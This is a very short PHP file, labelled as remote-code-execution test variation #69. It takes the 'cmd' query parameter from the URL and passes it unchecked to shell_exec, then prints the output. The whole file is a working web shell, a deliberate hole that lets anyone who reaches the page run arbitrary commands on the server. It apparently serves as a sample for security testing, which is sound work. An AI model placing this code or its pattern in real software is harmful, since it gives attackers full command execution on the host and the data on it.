<?php
// RCE test variation #69
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>